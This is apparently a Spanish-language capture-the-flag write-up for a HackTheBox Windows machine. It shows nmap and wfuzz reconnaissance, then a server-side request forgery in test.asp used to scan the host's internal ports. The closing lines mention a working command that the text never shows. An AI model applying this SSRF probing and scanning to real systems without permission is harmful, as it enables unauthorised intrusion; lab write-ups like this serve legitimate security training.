## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.57
```
ttl: 127 -> maquina Windows. 
Recuerda que en cuanto a ttl respecta 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.57 
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.57 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p62696 10.10.10.57 -oN targeted
```

| Puerto | Servicio   | Que se nos occure? | Que falta? |
| ------ | ---------- | ------------------ | ---------- |
| 62696  | http - IIS | Web, fuzzing, .asp |            |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.57:62696
```

Nada muy interesante

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p62696 10.10.10.57 -oN webScan
```

No nos detecta nada

#### Chequear la web por puerto 62696 {-}

Con firefox navegamos en la web para ver lo que es.

La pagina esta under construction y poco mas.


#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.57:62696/FUZZ
```

Encontramos un ruta `/backend` pero no se ve nada en firefox. Decidimos fuzzear con la extension `.asp`

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.57:62696/FUZZ.asp
```

Aqui encontramos un fichero `test.asp` y navigando no dice que no encuentra el parametro `u` que tendria que ser un URL.
Intentamos ver si se conecta a nuestro servidor web

1. Creamos un servidor web

    ```bash
    python3 -m http.server 80
    ```

1. Intentamos conectar por la web 

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://10.10.14.8
    http://10.10.10.57:62696/test.asp?u=http://10.10.14.8/test
    ```

Aqui no pasa nada. La idea aqui, como solo tiene un puerto abierto seria de explorar si tiene puerto privados usando localhost

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost
```

Aqui ya vemos que el puerto 80 interno de la maquina esta abierto. Decidimos descubrir los puertos abiertos de la maquina con WFUZZ


### Descubrimiento de los puertos abiertos con WFUZZ {-}

Wfuzz permite hacer rangos de numeros con el parametro `-z`

```bash
wfuzz -c -t 200 --hc=404 -z range,1-65535 http://10.10.10.57:62696/test.asp?u=http://localhost:FUZZ
```

Como nunca va a existir un codigo de estado 404, (porque el recurso existe), wfuzz no va a reportar como validas todas
las requests. Hay que lanzar una vez y occultar las palabra que son de 89

```bash
wfuzz -c -t 200 --hc=404 --hw=89 -z range,1-65535 http://10.10.10.57:62696/test.asp?u=http://localhost:FUZZ
```

Aqui vemos que solo el puerto 80 esta abierto.



Esto funciona. Pero no vemos en la web el output del comando. Solo vemos el codigo de estado (0 si el comando a funcionado, 1 si no a funcionado)

